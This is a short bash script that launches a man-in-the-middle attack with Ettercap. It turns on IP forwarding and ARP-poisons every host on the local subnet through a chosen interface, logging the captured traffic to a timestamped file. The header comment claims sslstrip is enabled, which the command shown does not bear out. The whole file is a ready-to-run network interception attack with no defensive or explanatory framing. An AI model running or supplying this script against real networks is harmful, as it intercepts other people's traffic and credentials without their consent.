#!/usr/bin/env bash
# MITM attack: ARP-poison entire subnet, sslstrip enabled
# Usage: sudo ./run_ettercap.sh en0

set -e
IFACE="${1:-en0}"

echo "[*] Enabling IP forwarding"
sudo sysctl -w net.inet.ip.forwarding=1 >/dev/null

LOG=../../data/attack_$(date +%Y%m%d_%H%M%S).log
echo "[*] Launching Ettercap on $IFACE  (log: $LOG)"
sudo ettercap -T -q -i "$IFACE" -M arp:remote / /  2>&1 | tee "$LOG"
